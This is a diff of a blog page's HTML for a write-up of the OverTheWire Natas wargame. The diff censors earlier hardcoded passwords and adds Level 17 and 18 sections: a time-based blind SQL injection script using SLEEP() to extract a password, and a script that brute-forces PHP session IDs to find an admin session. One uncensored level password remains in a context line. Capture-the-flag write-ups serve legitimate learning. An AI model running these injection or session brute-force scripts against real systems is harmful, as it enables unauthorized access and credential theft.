@@ -463,6 +463,42 @@ if (!doNotTrack) {
 					
 				
 			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#level-18" class="nav-level-18">
+									Level 18
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#level-19" class="nav-level-19">
+									Level 19
+								</a>
+							</li>
+						
+						
+					
+				
+			
 		</ul>
 	</div>
 
@@ -702,7 +738,7 @@ C: 0l;$$98-8=?#9*jvi 'ngl*+(!$#9lrnh(.*-(.n6
 <pre><code>import requests
 
 url = &quot;http://natas15.natas.labs.overthewire.org&quot;
-credentials = (&quot;natas15&quot;, &quot;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&quot;)
+credentials = (&quot;natas15&quot;, &quot;{censored}&quot;)
 form_data = {&quot;username&quot;: &quot;x&quot;}
 password=&quot;&quot;
 
@@ -779,7 +815,7 @@ for i in range(1, 33):
 <pre><code>import requests
 
 url = &quot;http://natas16.natas.labs.overthewire.org&quot;
-credentials = (&quot;natas16&quot;, &quot;TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V&quot;)
+credentials = (&quot;natas16&quot;, &quot;{censored}&quot;)
 form_data = {&quot;needle&quot;: &quot;x&quot;}
 
 for i in range(1,33):
@@ -796,7 +832,7 @@ for i in range(1,33):
 <pre><code>import requests
 
 url = &quot;http://natas16.natas.labs.overthewire.org&quot;
-credentials = (&quot;natas16&quot;, &quot;TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V&quot;)
+credentials = (&quot;natas16&quot;, &quot;{censored}&quot;)
 form_data = {&quot;needle&quot;: &quot;x&quot;}
 
 password = &quot;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&quot;
@@ -823,6 +859,65 @@ for i in range(1,33):
 <p>This was the hardest level yet for sure. I kept coming back to it over the course of a couple weeks before I finally figured it out. It&rsquo;s hard to say whether this was even close to the intended solution. I still wonder whether there was a way of escaping the quotes that I overlooked.</p>
 <hr>
 <h2 id="level-17">Level 17</h2>
+<p>This level has the same source code as level 15 except that it no longer let&rsquo;s us know whether the user exists. Effectively this leaves us with no feedback to go on. To get around this, there is a MySQL function called &ldquo;SLEEP()&rdquo; that we can use. The sleep function can be used anywhere you would place a condition such as &ldquo;username=&rdquo;. The time it takes for the response to come back from the server can indicate whether the sleep function was used. So if we order the SQL server to sleep when we make a correct guess (refer to level15 above) then the response time will provide a signal for the script to save that character.</p>
+<p>It stands to reason that we can just take the script from Level 15 and tweak it a bit, since the problem is largely the same.</p>
+<pre><code>import time
+import requests
+
+url = &quot;http://natas17.natas.labs.overthewire.org&quot;
+credentials = (&quot;natas17&quot;, &quot;{censored}&quot;)
+form_data = {&quot;username&quot;: &quot;x&quot;}
+password=&quot;&quot;
+
+alphanumeric_chars = [
+'0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
+'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
+'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
+'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
+'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
+'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
+'y', 'z'
+]
+
+for i in range(1, 33):
+    for j in alphanumeric_chars:
+        form_data[&quot;username&quot;] = f&quot;natas18\&quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)} AND SLEEP(5) #&quot;
+  
+        # make curl request and measure elapsed time
+        start = time.time()
+        response = requests.post(url, auth=credentials, data=form_data)
+        end = time.time()
+        
+        if (end-start) &gt; 5:
+            password += j
+            print(f&quot;index: {i}\nguess: {j}&quot;)
+            print(&quot;Status code:&quot;, response.status_code)
+            print(&quot;Response time:&quot;, str(round(end-start, 2)) +&quot;s&quot;)
+            print(f&quot;Password: {password}&quot;)
+            break
+</code></pre><hr>
+<h2 id="level-18">Level 18</h2>
+<p>This level has a login form. It states that you need to login as admin to get the credentials to the next level. Looking at the source code, the actual login box essentially does nothing. It instead relies on PHP session ID for authentication. The max possible ID is 640. I plotted the program&rsquo;s flow on a chart to get a better understanding.</p>
+<p><img src="/images/natas18-0.png" alt=""></p>
+<p>I couldn&rsquo;t really find any way to exploit this, but it occurred to me that there is likely an ID which already has its admin flag set to 1. With such a low number of possible IDs, I could easily bruteforce the session ID to find an admin session. Here is a script I created to do just that:</p>
+<pre><code>import requests
+
+url = &quot;http://natas18.natas.labs.overthewire.org&quot;
+credentials = (&quot;natas18&quot;, &quot;{censored}&quot;)
+form_data = {&quot;username&quot;: &quot;&quot;, &quot;password&quot;: &quot;&quot;, &quot;debug&quot;: &quot;&quot;}
+cookie_data = {&quot;PHPSESSID&quot;: &quot;x&quot;}
+
+for i in range(1, 640):
+        cookie_data[&quot;PHPSESSID&quot;] = str(i)
+        response = requests.get(url, cookies=cookie_data, auth=credentials, data=form_data)
+        print(response.text)
+        print(&quot;guess:&quot;, i)
+        if &quot;Password&quot; in response.text:
+
+            break
+</code></pre><p>Sure enough, one particular ID granted the password.</p>
+<hr>
+<h2 id="level-19">Level 19</h2>
 <p>(coming soon)</p>
 
                     
@@ -1274,6 +1369,42 @@ for i in range(1,33):
 							<li>
 								<a href="#level-17" class="nav-level-17">
 									Level 17
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#level-18" class="nav-level-18">
+									Level 18
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#level-19" class="nav-level-19">
+									Level 19
 								</a>
 							</li>
 						
